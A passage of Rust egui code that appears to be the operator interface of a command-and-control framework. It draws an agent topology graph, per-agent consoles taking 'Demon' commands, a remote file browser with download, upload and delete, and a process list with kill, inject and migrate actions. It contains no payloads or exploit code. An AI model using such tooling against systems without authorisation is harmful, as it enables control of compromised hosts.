            let from_size = graph_node_size(&layout, &edge.from).unwrap_or(egui::Vec2::ZERO);
            let to_size = graph_node_size(&layout, &edge.to).unwrap_or(egui::Vec2::ZERO);
            let start = session_graph_world_to_screen(
                rect,
                &self.session_panel.graph_state,
                Pos2::new(from.x, from.y + from_size.y * 0.5),
            );
            let end = session_graph_world_to_screen(
                rect,
                &self.session_panel.graph_state,
                Pos2::new(to.x, to.y - to_size.y * 0.5),
            );
            let mid_y = (start.y + end.y) * 0.5;
            painter.line_segment(
                [start, Pos2::new(start.x, mid_y)],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
            painter.line_segment(
                [Pos2::new(start.x, mid_y), Pos2::new(end.x, mid_y)],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
            painter.line_segment(
                [Pos2::new(end.x, mid_y), end],
                Stroke::new(2.0, Color32::from_rgb(92, 112, 140)),
            );
        }

        for node in &layout.nodes {
            let node_rect = session_graph_node_rect(
                rect,
                &self.session_panel.graph_state,
                node.position,
                node.size,
            );
            let fill = match node.kind {
                SessionGraphNodeKind::Teamserver => Color32::from_rgb(36, 84, 122),
                SessionGraphNodeKind::Agent => session_graph_status_color(&node.status),
            };
            let stroke_color = if hovered_node.as_deref() == Some(node.id.as_str()) {
                Color32::WHITE
            } else {
                Color32::from_rgba_unmultiplied(255, 255, 255, 56)
            };
            painter.rect_filled(node_rect, 8.0, fill);
            painter.rect_stroke(
                node_rect,
                8.0,
                Stroke::new(1.5, stroke_color),
                egui::StrokeKind::Middle,
            );
            painter.text(
                Pos2::new(node_rect.center().x, node_rect.center().y - 10.0),
                Align2::CENTER_CENTER,
                &node.title,
                FontId::proportional(16.0),
                Color32::WHITE,
            );
            painter.text(
                Pos2::new(node_rect.center().x, node_rect.center().y + 10.0),
                Align2::CENTER_CENTER,
                &node.subtitle,
                FontId::monospace(13.0),
                Color32::from_rgb(228, 232, 237),
            );
        }

        let legend_rect =
            Rect::from_min_size(rect.left_top() + egui::vec2(12.0, 12.0), egui::vec2(210.0, 48.0));
        painter.rect_filled(legend_rect, 8.0, Color32::from_rgba_unmultiplied(8, 10, 14, 190));
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(18.0, -10.0),
            5.0,
            Color32::from_rgb(84, 170, 110),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(30.0, -10.0),
            Align2::LEFT_CENTER,
            "Alive",
            FontId::proportional(13.0),
            Color32::WHITE,
        );
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(88.0, -10.0),
            5.0,
            Color32::from_rgb(174, 68, 68),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(100.0, -10.0),
            Align2::LEFT_CENTER,
            "Dead",
            FontId::proportional(13.0),
            Color32::WHITE,
        );
        painter.circle_filled(
            legend_rect.left_center() + egui::vec2(150.0, -10.0),
            5.0,
            Color32::from_rgb(36, 84, 122),
        );
        painter.text(
            legend_rect.left_center() + egui::vec2(162.0, -10.0),
            Align2::LEFT_CENTER,
            "Root",
            FontId::proportional(13.0),
            Color32::WHITE,
        );

        if layout.nodes.len() == 1 {
            painter.text(
                rect.center_bottom() + egui::vec2(0.0, -18.0),
                Align2::CENTER_CENTER,
                "No agent topology available yet.",
                FontId::proportional(15.0),
                Color32::from_gray(170),
            );
        }
    }

    #[allow(dead_code)]
    fn render_console_tabs(&mut self, ui: &mut egui::Ui) {
        let mut close_agent = None;

        ui.horizontal_wrapped(|ui| {
            for agent_id in self.session_panel.open_consoles.clone() {
                let selected = self.session_panel.selected_console.as_deref() == Some(&agent_id);
                ui.group(|ui| {
                    ui.horizontal(|ui| {
                        if ui.selectable_label(selected, &agent_id).clicked() {
                            self.session_panel.selected_console = Some(agent_id.clone());
                        }
                        if ui.small_button("x").clicked() {
                            close_agent = Some(agent_id.clone());
                        }
                    });
                });
            }
        });

        if let Some(agent_id) = close_agent {
            self.session_panel.close_console(&agent_id);
        }
    }

    fn render_single_console(&mut self, ui: &mut egui::Ui, state: &AppState, agent_id: &str) {
        let agent = state.agents.iter().find(|agent| agent.name_id == agent_id);
        let entries = state.agent_consoles.get(agent_id).map(Vec::as_slice).unwrap_or(&[]);
        let browser = state.file_browsers.get(agent_id);
        let process_list = state.process_lists.get(agent_id);
        let status_message = self
            .session_panel
            .console_state
            .get(agent_id)
            .and_then(|console| console.status_message.clone());

        egui::Frame::default()
            .fill(Color32::from_rgba_unmultiplied(255, 255, 255, 6))
            .stroke(Stroke::new(1.0, Color32::from_rgba_unmultiplied(255, 255, 255, 18)))
            .inner_margin(egui::Margin::symmetric(10, 10))
            .show(ui, |ui| {
                if let Some(agent) = agent {
                    ui.horizontal_wrapped(|ui| {
                        ui.label(RichText::new(&agent.name_id).strong().monospace());
                        ui.separator();
                        ui.label(RichText::new(&agent.hostname).strong());
                        ui.separator();
                        ui.label(format!("{}\\{}", agent.domain_name, agent.username));
                        ui.separator();
                        ui.label(format!("PID {}", agent.process_pid));
                        ui.separator();
                        ui.label(&agent.process_name);
                        ui.separator();
                        ui.label(format!("Status: {}", agent.status));
                    });
                    ui.add_space(4.0);
                    ui.label(
                        RichText::new(format!(
                            "{} | {} | {}",
                            blank_if_empty(&agent.internal_ip, &agent.external_ip),
                            agent_os(agent),
                            agent_arch(agent)
                        ))
                        .weak(),
                    );
                    if !agent.note.trim().is_empty() {
                        ui.add_space(4.0);
                        ui.label(RichText::new(format!("Note: {}", agent.note)).weak());
                    }
                } else {
                    ui.label(
                        RichText::new(format!("Agent {agent_id} is no longer present")).weak(),
                    );
                }

                if let Some(message) = &status_message {
                    ui.add_space(6.0);
                    ui.colored_label(Color32::from_rgb(232, 182, 83), message);
                }

                ui.add_space(8.0);
                ui.separator();
                ui.add_space(8.0);

                ui.columns(2, |columns| {
                    self.render_file_browser_panel(&mut columns[0], agent_id, browser);
                    self.render_console_output_panel(&mut columns[1], agent_id, entries);
                });

                ui.add_space(8.0);
                self.render_console_input(ui, agent_id);

                ui.add_space(12.0);
                ui.separator();
                ui.add_space(8.0);
                self.render_process_panel(ui, agent, agent_id, process_list);
            });
    }

    /// Standalone file browser tab — dual-pane explorer with directory tree (left)
    /// and file list (right), breadcrumb bar, and action toolbar.
    fn render_file_browser_tab(&mut self, ui: &mut egui::Ui, state: &AppState, agent_id: &str) {
        let agent = state.agents.iter().find(|a| a.name_id == agent_id);
        let browser = state.file_browsers.get(agent_id);

        egui::Frame::default().inner_margin(egui::Margin::symmetric(10, 10)).show(ui, |ui| {
            // ── Agent header ──────────────────────────────────────
            if let Some(agent) = agent {
                ui.horizontal_wrapped(|ui| {
                    ui.label(
                        RichText::new(format!("{} File Explorer", agent.name_id))
                            .strong()
                            .monospace(),
                    );
                    ui.separator();
                    ui.label(RichText::new(&agent.hostname).strong());
                    ui.separator();
                    ui.label(format!("{}\\{}", agent.domain_name, agent.username));
                });
            } else {
                ui.label(RichText::new(format!("Agent {agent_id} is no longer present")).weak());
            }

            ui.add_space(4.0);
            ui.separator();
            ui.add_space(4.0);

            // ── Breadcrumb / path bar ─────────────────────────────
            let current_dir = browser
                .and_then(|s| s.current_dir.clone())
                .or_else(|| browser.and_then(|s| s.directories.keys().next().cloned()));

            self.render_file_browser_breadcrumb(ui, agent_id, browser, current_dir.as_deref());

            ui.add_space(4.0);

            // ── Action toolbar ────────────────────────────────────
            self.render_file_browser_toolbar(ui, agent_id, browser);

            // ── Status messages ───────────────────────────────────
            let browser_status = browser.and_then(|s| s.status_message.as_deref());
            let ui_status = self
                .session_panel
                .file_browser_state
                .get(agent_id)
                .and_then(|s| s.status_message.as_deref());
            if let Some(message) = ui_status.or(browser_status) {
                ui.add_space(4.0);
                ui.label(RichText::new(message).weak());
            }

            ui.add_space(6.0);
            ui.separator();
            ui.add_space(4.0);

            // ── Dual-pane: directory tree (left) + file list (right) ─
            let available = ui.available_size();
            let left_width = (available.x * 0.35).max(180.0);
            ui.horizontal(|ui| {
                // Left pane — directory tree
                ui.allocate_ui(egui::vec2(left_width, available.y - 20.0), |ui| {
                    ui.label(RichText::new("Directories").strong());
                    ui.separator();
                    egui::ScrollArea::both().id_salt(("fb-tree", agent_id)).show(ui, |ui| {
                        if let Some(browser) = browser {
                            if let Some(root) = current_dir.as_deref() {
                                self.render_directory_tree(ui, agent_id, browser, root, 0);
                            } else {
                                ui.label("Resolve cwd to initialize.");
                            }
                        } else {
                            ui.label("No filesystem state yet.");
                        }
                    });
                });

                ui.separator();

                // Right pane — file list table
                ui.vertical(|ui| {
                    ui.label(RichText::new("Files").strong());
                    ui.separator();
                    self.render_file_list_table(ui, agent_id, browser, current_dir.as_deref());
                });
            });

            // ── Downloads progress ────────────────────────────────
            if let Some(browser) = browser {
                if !browser.downloads.is_empty() {
                    ui.add_space(8.0);
                    ui.separator();
                    ui.label(RichText::new("Downloads").strong());
                    for progress in browser.downloads.values() {
                        let denominator = progress.expected_size.max(1) as f32;
                        let fraction = (progress.current_size as f32 / denominator).clamp(0.0, 1.0);
                        ui.add(egui::ProgressBar::new(fraction).text(format!(
                            "{} [{} / {}]",
                            progress.remote_path,
                            human_size(progress.current_size),
                            human_size(progress.expected_size)
                        )));
                    }
                }
            }
        });
    }

    /// Breadcrumb path bar for the file browser tab.
    fn render_file_browser_breadcrumb(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: Option<&AgentFileBrowserState>,
        current_dir: Option<&str>,
    ) {
        ui.horizontal_wrapped(|ui| {
            ui.label(RichText::new("Path:").strong());

            if let Some(path) = current_dir {
                // Split path into breadcrumb segments
                let segments = breadcrumb_segments(path);
                for (i, (label, full_path)) in segments.iter().enumerate() {
                    if i > 0 {
                        ui.label(RichText::new(path_separator(path)).weak());
                    }
                    if ui.link(RichText::new(label.as_str()).monospace()).clicked() {
                        self.queue_file_browser_cd(agent_id, full_path);
                        self.queue_file_browser_list(agent_id, full_path);
                    }
                }
            } else {
                ui.monospace("unknown");
            }

            ui.separator();

            if ui.button("Resolve cwd").clicked() {
                self.queue_file_browser_pwd(agent_id);
            }
            if ui.button("Refresh").clicked() {
                if let Some(path) = current_dir {
                    self.queue_file_browser_list(agent_id, path);
                }
            }
            if ui.button("Up").clicked() {
                if let Some(path) = current_dir.and_then(parent_remote_path) {
                    self.queue_file_browser_cd(agent_id, &path);
                    self.queue_file_browser_list(agent_id, &path);
                }
            }

            // Auto-request listing if the current directory is not yet loaded
            let loaded_paths = browser.map(|s| &s.directories);
            let operator = self.current_operator_username();
            {
                let ui_state = self.session_panel.file_browser_state_mut(agent_id);
                if let Some(browser) = browser {
                    ui_state.pending_dirs.retain(|p| !browser.directories.contains_key(p));
                }
                if let Some(root) = current_dir {
                    if loaded_paths.is_none_or(|paths| !paths.contains_key(root))
                        && !ui_state.pending_dirs.contains(root)
                    {
                        let message = build_file_browser_list_task(agent_id, root, &operator);
                        ui_state.pending_dirs.insert(root.to_owned());
                        ui_state.status_message = Some(format!("Queued listing for {root}."));
                        self.session_panel.pending_messages.push(message);
                    }
                }
            }
        });
    }

    /// Action toolbar for the file browser tab (Download, Upload, Delete, Set Working Dir).
    fn render_file_browser_toolbar(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: Option<&AgentFileBrowserState>,
    ) {
        ui.horizontal_wrapped(|ui| {
            let selected_path = self
                .session_panel
                .file_browser_state
                .get(agent_id)
                .and_then(|s| s.selected_path.clone());
            let selected_entry = browser.and_then(|state| {
                selected_path.as_deref().and_then(|path| find_file_entry(state, path))
            });
            let selected_directory = selected_remote_directory(browser, selected_path.as_deref());

            if ui
                .add_enabled(selected_directory.is_some(), egui::Button::new("Set Working Dir"))
                .clicked()
                && let Some(path) = selected_directory.as_deref()
            {
                self.queue_file_browser_cd(agent_id, path);
                self.queue_file_browser_list(agent_id, path);
            }

            if ui
                .add_enabled(
                    selected_entry.is_some_and(|entry| !entry.is_dir),
                    egui::Button::new("Download"),
                )
                .clicked()
            {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_download(agent_id, path);
                }
            }

            if ui.button("Upload").clicked() {
                self.queue_file_browser_upload(
                    agent_id,
                    upload_destination(browser, selected_path.as_deref()),
                );
            }

            if ui.add_enabled(selected_path.is_some(), egui::Button::new("Delete")).clicked() {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_delete(agent_id, path);
                }
            }

            if let Some(path) = &selected_path {
                ui.separator();
                ui.label(RichText::new(format!("Selected: {path}")).weak().monospace());
            }
        });
    }

    /// Right-pane file list table for the standalone file browser tab.
    fn render_file_list_table(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: Option<&AgentFileBrowserState>,
        current_dir: Option<&str>,
    ) {
        // Determine the directory to show in the file list — use the selected
        // path if it's a directory, otherwise fall back to the current working
        // directory.
        let selected_path = self
            .session_panel
            .file_browser_state
            .get(agent_id)
            .and_then(|s| s.selected_path.clone());
        let display_dir = selected_remote_directory(browser, selected_path.as_deref())
            .or_else(|| current_dir.map(String::from));

        let entries =
            display_dir.as_deref().and_then(|dir| browser.and_then(|b| b.directories.get(dir)));

        egui::ScrollArea::both().id_salt(("fb-files", agent_id)).show(ui, |ui| {
            if let Some(entries) = entries {
                if entries.is_empty() {
                    ui.label("Directory is empty.");
                    return;
                }

                // Header row
                egui::Grid::new(("fb-file-grid", agent_id))
                    .num_columns(4)
                    .spacing([12.0, 4.0])
                    .striped(true)
                    .show(ui, |ui| {
                        ui.label(RichText::new("Name").strong());
                        ui.label(RichText::new("Size").strong());
                        ui.label(RichText::new("Modified").strong());
                        ui.label(RichText::new("Permissions").strong());
                        ui.end_row();

                        // Directories first, then files
                        let mut sorted: Vec<_> = entries.iter().collect();
                        sorted.sort_by(|a, b| {
                            b.is_dir.cmp(&a.is_dir).then_with(|| a.name.cmp(&b.name))
                        });

                        for entry in sorted {
                            let is_selected = self
                                .session_panel
                                .file_browser_state
                                .get(agent_id)
                                .and_then(|s| s.selected_path.as_deref())
                                == Some(entry.path.as_str());

                            let icon = if entry.is_dir { "\u{1F4C1}" } else { "\u{1F4C4}" };
                            let name_text = format!("{icon} {}", entry.name);
                            let label_text = if entry.is_dir {
                                RichText::new(&name_text)
                                    .monospace()
                                    .color(Color32::from_rgb(80, 180, 220))
                            } else {
                                RichText::new(&name_text).monospace()
                            };

                            let response = ui.selectable_label(is_selected, label_text);
                            if response.clicked() {
                                self.session_panel.file_browser_state_mut(agent_id).selected_path =
                                    Some(entry.path.clone());
                            }
                            if response.double_clicked() && entry.is_dir {
                                self.queue_file_browser_cd(agent_id, &entry.path);
                                self.queue_file_browser_list(agent_id, &entry.path);
                            }

                            // Context menu on each entry
                            response.context_menu(|ui| {
                                if entry.is_dir {
                                    if ui.button("Open").clicked() {
                                        self.queue_file_browser_cd(agent_id, &entry.path);
                                        self.queue_file_browser_list(agent_id, &entry.path);
                                        ui.close();
                                    }
                                } else {
                                    if ui.button("Download").clicked() {
                                        self.queue_file_browser_download(agent_id, &entry.path);
                                        ui.close();
                                    }
                                }
                                if ui.button("Delete").clicked() {
                                    self.queue_file_browser_delete(agent_id, &entry.path);
                                    ui.close();
                                }
                            });

                            ui.label(RichText::new(&entry.size_label).monospace().weak());
                            ui.label(RichText::new(&entry.modified_at).monospace().weak());
                            ui.label(RichText::new(&entry.permissions).monospace().weak());
                            ui.end_row();
                        }
                    });
            } else {
                ui.label("Select a directory to view its contents.");
            }
        });
    }

    fn render_console_output_panel(
        &self,
        ui: &mut egui::Ui,
        agent_id: &str,
        entries: &[AgentConsoleEntry],
    ) {
        ui.heading("Console Output");
        ui.separator();
        egui::ScrollArea::vertical()
            .id_salt(("console-output", agent_id))
            .stick_to_bottom(true)
            .max_height(360.0)
            .show(ui, |ui| {
                if entries.is_empty() {
                    ui.label("No console output for this session yet.");
                } else {
                    for entry in entries {
                        self.render_console_entry(ui, entry);
                        ui.add_space(4.0);
                    }
                }
            });
    }

    fn render_file_browser_panel(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: Option<&AgentFileBrowserState>,
    ) {
        ui.heading("File Browser");
        ui.separator();

        let current_dir = browser
            .and_then(|state| state.current_dir.clone())
            .or_else(|| browser.and_then(|state| state.directories.keys().next().cloned()));
        let loaded_paths = browser.map(|state| &state.directories);
        let operator = self.current_operator_username();
        {
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            if let Some(browser) = browser {
                ui_state.pending_dirs.retain(|path| !browser.directories.contains_key(path));
            }
            if let Some(root) = current_dir.clone() {
                if loaded_paths.is_none_or(|paths| !paths.contains_key(&root))
                    && !ui_state.pending_dirs.contains(&root)
                {
                    let message = build_file_browser_list_task(agent_id, &root, &operator);
                    ui_state.pending_dirs.insert(root.clone());
                    ui_state.status_message = Some(format!("Queued listing for {root}."));
                    self.session_panel.pending_messages.push(message);
                }
            }
        }

        ui.horizontal_wrapped(|ui| {
            ui.label("Current");
            ui.monospace(current_dir.as_deref().unwrap_or("unknown"));

            if ui.button("Resolve cwd").clicked() {
                self.queue_file_browser_pwd(agent_id);
            }
            if ui.button("Refresh").clicked() {
                if let Some(path) = current_dir.as_deref() {
                    self.queue_file_browser_list(agent_id, path);
                }
            }
            if ui.button("Up").clicked() {
                if let Some(path) = current_dir.as_deref().and_then(parent_remote_path) {
                    self.queue_file_browser_cd(agent_id, &path);
                    self.queue_file_browser_list(agent_id, &path);
                }
            }
        });

        let browser_status = browser.and_then(|state| state.status_message.as_deref());
        let ui_status = self
            .session_panel
            .file_browser_state
            .get(agent_id)
            .and_then(|state| state.status_message.as_deref());
        if let Some(message) = ui_status.or(browser_status) {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }

        ui.add_space(6.0);
        ui.horizontal_wrapped(|ui| {
            let selected_path = self
                .session_panel
                .file_browser_state
                .get(agent_id)
                .and_then(|state| state.selected_path.clone());
            let selected_entry = browser.and_then(|state| {
                selected_path.as_deref().and_then(|path| find_file_entry(state, path))
            });
            let selected_directory = selected_remote_directory(browser, selected_path.as_deref());

            if ui
                .add_enabled(selected_directory.is_some(), egui::Button::new("Set Working Dir"))
                .clicked()
                && let Some(path) = selected_directory.as_deref()
            {
                self.queue_file_browser_cd(agent_id, path);
                self.queue_file_browser_list(agent_id, path);
            }

            if ui
                .add_enabled(
                    selected_entry.is_some_and(|entry| !entry.is_dir),
                    egui::Button::new("Download"),
                )
                .clicked()
            {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_download(agent_id, path);
                }
            }

            if ui.button("Upload").clicked() {
                self.queue_file_browser_upload(
                    agent_id,
                    upload_destination(browser, selected_path.as_deref()),
                );
            }

            if ui.add_enabled(selected_path.is_some(), egui::Button::new("Delete")).clicked() {
                if let Some(path) = selected_path.as_deref() {
                    self.queue_file_browser_delete(agent_id, path);
                }
            }
        });

        ui.add_space(6.0);
        if let Some(browser) = browser {
            if let Some(root) = current_dir.as_deref() {
                self.render_directory_tree(ui, agent_id, browser, root, 0);
            } else {
                ui.label("Request the current working directory to initialize the browser.");
            }

            if !browser.downloads.is_empty() {
                ui.add_space(8.0);
                ui.label(RichText::new("Downloads").strong());
                for progress in browser.downloads.values() {
                    let denominator = progress.expected_size.max(1) as f32;
                    let fraction = (progress.current_size as f32 / denominator).clamp(0.0, 1.0);
                    ui.add(egui::ProgressBar::new(fraction).text(format!(
                        "{} [{} / {}]",
                        progress.remote_path,
                        human_size(progress.current_size),
                        human_size(progress.expected_size)
                    )));
                }
            }
        } else {
            ui.label("No filesystem state has been received for this agent yet.");
        }
    }

    fn render_directory_tree(
        &mut self,
        ui: &mut egui::Ui,
        agent_id: &str,
        browser: &AgentFileBrowserState,
        path: &str,
        depth: usize,
    ) {
        let label = directory_label(path);
        let response = egui::CollapsingHeader::new(label)
            .id_salt(("file-browser-dir", agent_id, path))
            .default_open(depth == 0)
            .show(ui, |ui| {
                if let Some(entries) = browser.directories.get(path) {
                    if entries.is_empty() {
                        ui.label("Directory is empty.");
                    } else {
                        for entry in entries {
                            if entry.is_dir {
                                self.render_directory_tree(
                                    ui,
                                    agent_id,
                                    browser,
                                    &entry.path,
                                    depth + 1,
                                );
                            } else {
                                let selected = self
                                    .session_panel
                                    .file_browser_state
                                    .get(agent_id)
                                    .and_then(|state| state.selected_path.as_deref())
                                    == Some(entry.path.as_str());
                                if ui.selectable_label(selected, file_entry_label(entry)).clicked()
                                {
                                    self.session_panel
                                        .file_browser_state_mut(agent_id)
                                        .selected_path = Some(entry.path.clone());
                                }
                            }
                        }
                    }
                } else {
                    ui.label("Waiting for directory listing...");
                }
            });

        if response.header_response.clicked() {
            self.session_panel.file_browser_state_mut(agent_id).selected_path =
                Some(path.to_owned());
        }

        if response.fully_open() && !browser.directories.contains_key(path) {
            let operator = self.current_operator_username();
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            if !ui_state.pending_dirs.contains(path) {
                let message = build_file_browser_list_task(agent_id, path, &operator);
                ui_state.pending_dirs.insert(path.to_owned());
                ui_state.status_message = Some(format!("Queued listing for {path}."));
                self.session_panel.pending_messages.push(message);
            }
        }
    }

    fn render_console_entry(&self, ui: &mut egui::Ui, entry: &AgentConsoleEntry) {
        let accent = match entry.kind {
            AgentConsoleEntryKind::Output => Color32::from_rgb(110, 199, 141),
            AgentConsoleEntryKind::Error => Color32::from_rgb(215, 83, 83),
        };

        ui.group(|ui| {
            ui.horizontal_wrapped(|ui| {
                let timestamp = blank_if_empty(&entry.received_at, "pending");
                ui.label(RichText::new(timestamp).weak().monospace());
                ui.separator();
                ui.colored_label(accent, RichText::new(&entry.command_id).monospace());
                if let Some(command_line) = &entry.command_line {
                    if !command_line.trim().is_empty() {
                        ui.separator();
                        ui.label(RichText::new(command_line).monospace().weak());
                    }
                }
            });
            ui.add_space(2.0);
            ui.label(RichText::new(&entry.output).monospace().color(accent));
        });
    }

    fn render_console_input(&mut self, ui: &mut egui::Ui, agent_id: &str) {
        let mut run_command = false;

        let prompt = format_console_prompt(&self.current_operator_username(), agent_id);

        ui.horizontal(|ui| {
            ui.label(RichText::new(&prompt).strong().monospace());
            let response = {
                let console = self.session_panel.console_state_mut(agent_id);
                ui.add(
                    egui::TextEdit::singleline(&mut console.input)
                        .id_source(("console-input", agent_id))
                        .desired_width(f32::INFINITY)
                        .hint_text("Enter a Demon command (type 'help' for available commands)"),
                )
            };

            let send_requested =
                response.lost_focus() && ui.input(|input| input.key_pressed(Key::Enter));
            let tab_pressed = response.has_focus() && ui.input(|input| input.key_pressed(Key::Tab));
            let up_pressed =
                response.has_focus() && ui.input(|input| input.key_pressed(Key::ArrowUp));
            let down_pressed =
                response.has_focus() && ui.input(|input| input.key_pressed(Key::ArrowDown));

            if up_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_history_step(console, HistoryDirection::Older);
                response.request_focus();
            } else if down_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_history_step(console, HistoryDirection::Newer);
                response.request_focus();
            } else if tab_pressed {
                let console = self.session_panel.console_state_mut(agent_id);
                apply_completion(console);
                response.request_focus();
            }

            if response.changed() {
                let console = self.session_panel.console_state_mut(agent_id);
                console.completion_index = 0;
                console.completion_seed = None;
            }

            run_command = ui.button("Run").clicked() || send_requested;
        });

        if run_command {
            self.submit_console_command(agent_id);
        }
    }

    fn render_process_panel(
        &mut self,
        ui: &mut egui::Ui,
        agent: Option<&transport::AgentSummary>,
        agent_id: &str,
        process_list: Option<&AgentProcessListState>,
    ) {
        ui.heading("Process List");
        ui.separator();

        let current_pid = agent.and_then(|entry| entry.process_pid.trim().parse::<u32>().ok());
        let process_status = self
            .session_panel
            .process_state
            .get(agent_id)
            .and_then(|state| state.status_message.clone())
            .or_else(|| process_list.and_then(|state| state.status_message.clone()));

        ui.horizontal_wrapped(|ui| {
            ui.label("Filter");
            let filter = &mut self.session_panel.process_state_mut(agent_id).filter;
            ui.add(
                egui::TextEdit::singleline(filter)
                    .desired_width(180.0)
                    .hint_text("Search name or PID"),
            );

            if ui.button("Refresh").clicked() {
                self.queue_process_refresh(agent_id);
            }

            if let Some(updated_at) = process_list.and_then(|state| state.updated_at.as_deref()) {
                ui.separator();
                ui.label(RichText::new(format!("Updated {updated_at}")).weak());
            }

            if let Some(pid) = current_pid {
                ui.separator();
                ui.label(RichText::new(format!("Agent PID {pid}")).weak());
            }
        });

        if let Some(message) = process_status {
            ui.add_space(4.0);
            ui.label(RichText::new(message).weak());
        }
        ui.add_space(6.0);

        let Some(process_list) = process_list else {
            ui.label("No process list has been received for this agent yet.");
            return;
        };

        let filter = self
            .session_panel
            .process_state
            .get(agent_id)
            .map(|state| state.filter.as_str())
            .unwrap_or_default();
        let rows = filtered_process_rows(&process_list.rows, filter);
        if rows.is_empty() {
            ui.label("No processes match the current filter.");
            return;
        }

        egui::Grid::new(("process-table-header", agent_id))
            .num_columns(7)
            .spacing([10.0, 6.0])
            .show(ui, |ui| {
                ui.strong("PID");
                ui.strong("PPID");
                ui.strong("Name");
                ui.strong("Arch");
                ui.strong("User");
                ui.strong("Session");
                ui.strong("Actions");
                ui.end_row();
            });
        ui.separator();

        egui::ScrollArea::vertical().id_salt(("process-table", agent_id)).max_height(240.0).show(
            ui,
            |ui| {
                for row in rows {
                    let highlight = current_pid == Some(row.pid);
                    egui::Frame::default()
                        .fill(if highlight {
                            Color32::from_rgba_unmultiplied(110, 199, 141, 40)
                        } else {
                            Color32::TRANSPARENT
                        })
                        .inner_margin(egui::Margin::symmetric(6, 4))
                        .show(ui, |ui| {
                            egui::Grid::new(("process-row", agent_id, row.pid))
                                .num_columns(7)
                                .spacing([10.0, 4.0])
                                .show(ui, |ui| {
                                    ui.monospace(row.pid.to_string());
                                    ui.monospace(row.ppid.to_string());
                                    ui.label(&row.name);
                                    ui.label(&row.arch);
                                    ui.label(blank_if_empty(&row.user, "unknown"));
                                    ui.label(row.session.to_string());
                                    ui.horizontal_wrapped(|ui| {
                                        if ui.small_button("Kill").clicked() {
                                            self.queue_process_kill(agent_id, row.pid);
                                        }
                                        if ui.small_button("Inject").clicked() {
                                            self.open_process_injection_dialog(
                                                agent_id,
                                                row,
                                                InjectionTargetAction::Inject,
                                            );
                                        }
                                        if ui.small_button("Migrate").clicked() {
                                            self.open_process_injection_dialog(
                                                agent_id,
                                                row,
                                                InjectionTargetAction::Migrate,
                                            );
                                        }
                                    });
                                    ui.end_row();
                                });
                        });
                    ui.add_space(2.0);
                }
            },
        );
    }

    /// Standalone process list tab — full-height table with search, color-coded rows,
    /// and right-click context menu (kill, inject, migrate).
    fn render_process_list_tab(&mut self, ui: &mut egui::Ui, state: &AppState, agent_id: &str) {
        let agent = state.agents.iter().find(|a| a.name_id == agent_id);
        let process_list = state.process_lists.get(agent_id);

        let current_pid = agent.and_then(|a| a.process_pid.trim().parse::<u32>().ok());

        egui::Frame::default().inner_margin(egui::Margin::symmetric(10, 10)).show(ui, |ui| {
            // ── Agent header ──────────────────────────────────────
            if let Some(agent) = agent {
                ui.horizontal_wrapped(|ui| {
                    ui.label(
                        RichText::new(format!("Process: {}", agent.hostname))
                            .strong()
                            .monospace(),
                    );
                    ui.separator();
                    ui.label(RichText::new(&agent.name_id).strong().monospace());
                    ui.separator();
                    ui.label(format!("{}\\{}", agent.domain_name, agent.username));
                    if let Some(pid) = current_pid {
                        ui.separator();
                        ui.label(
                            RichText::new(format!("Agent PID {pid}"))
                                .color(Color32::from_rgb(255, 85, 85)),
                        );
                    }
                });
            } else {
                ui.label(RichText::new(format!("Agent {agent_id} is no longer present")).weak());
            }

            ui.add_space(4.0);
            ui.separator();
            ui.add_space(4.0);

            // ── Toolbar: search + refresh + status ───────────────
            let process_status = self
                .session_panel
                .process_state
                .get(agent_id)
                .and_then(|s| s.status_message.clone())
                .or_else(|| process_list.and_then(|s| s.status_message.clone()));

            ui.horizontal_wrapped(|ui| {
                ui.label("Filter");
                let filter = &mut self.session_panel.process_state_mut(agent_id).filter;
                ui.add(
                    egui::TextEdit::singleline(filter)
                        .desired_width(220.0)
                        .hint_text("Search name, PID, or user"),
                );

                if ui.button("Refresh").clicked() {
                    self.queue_process_refresh(agent_id);
                }

                if let Some(updated_at) =
                    process_list.and_then(|s| s.updated_at.as_deref())
                {
                    ui.separator();
                    ui.label(RichText::new(format!("Updated {updated_at}")).weak());
                }
            });

            if let Some(message) = process_status {
                ui.add_space(4.0);
                ui.label(RichText::new(message).weak());
            }
            ui.add_space(6.0);
            ui.separator();
            ui.add_space(4.0);

            // ── Process table ────────────────────────────────────
            let Some(process_list) = process_list else {
                ui.label("No process list has been received for this agent yet. Click Refresh to request one.");
                return;
            };

            let filter = self
                .session_panel
                .process_state
                .get(agent_id)
                .map(|s| s.filter.as_str())
                .unwrap_or_default();
            let rows = filtered_process_rows(&process_list.rows, filter);
            if rows.is_empty() {
                ui.label("No processes match the current filter.");
                return;
            }

            ui.label(
                RichText::new(format!("{} processes", rows.len()))
                    .weak()
                    .small(),
            );
            ui.add_space(4.0);

            // Table header
            egui::Grid::new(("process-tab-header", agent_id))
                .num_columns(7)
                .spacing([12.0, 6.0])
                .show(ui, |ui| {
                    ui.strong("Name");
                    ui.strong("PID");
                    ui.strong("PPID");
                    ui.strong("Session");
                    ui.strong("Arch");
                    ui.strong("User");
                    ui.strong("Actions");
                    ui.end_row();
                });
            ui.separator();

            // Table body (scrollable)
            egui::ScrollArea::vertical()
                .id_salt(("process-tab-body", agent_id))
                .show(ui, |ui| {
                    for row in &rows {
                        let is_agent = current_pid == Some(row.pid);
                        let is_system = row.user.to_ascii_lowercase().contains("system")
                            || row.user.to_ascii_lowercase().contains("local service")
                            || row.user.to_ascii_lowercase().contains("network service");

                        let bg = if is_agent {
                            Color32::from_rgba_unmultiplied(255, 85, 85, 35)
                        } else if is_system {
